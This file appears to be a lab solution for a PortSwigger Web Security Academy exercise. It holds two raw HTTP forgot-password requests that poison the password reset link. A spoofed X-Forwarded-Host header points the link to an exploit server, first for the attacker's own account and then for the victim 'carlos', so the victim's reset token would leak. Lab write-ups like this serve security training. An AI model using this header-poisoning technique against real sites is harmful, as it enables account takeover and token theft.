@@ -1,0 +1,33 @@
+# Test the poisoning with our own account first
+POST /forgot-password HTTP/1.1
+Host: ac411f821fc3de5280e1081c006e0015.web-security-academy.net
+X-Forwarded-Host: acb11fd21fa2deb08086087701600008.web-security-academy.net 		# Exploit server URL
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac411f821fc3de5280e1081c006e0015.web-security-academy.net/forgot-password
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Connection: close
+Cookie: session=BVyccGI0u5W3qjiCUQl9cPVreeZr7fG1
+Upgrade-Insecure-Requests: 1
+
+csrf=B32Oo3kmLPPT1vDhB8tSHfecr42gTGki&username=wiener
+
+# Send a poisoned request on behalf of victim
+POST /forgot-password HTTP/1.1
+Host: ac411f821fc3de5280e1081c006e0015.web-security-academy.net
+X-Forwarded-Host: acb11fd21fa2deb08086087701600008.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac411f821fc3de5280e1081c006e0015.web-security-academy.net/forgot-password
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Connection: close
+Cookie: session=BVyccGI0u5W3qjiCUQl9cPVreeZr7fG1
+Upgrade-Insecure-Requests: 1
+
+csrf=B32Oo3kmLPPT1vDhB8tSHfecr42gTGki&username=carlos
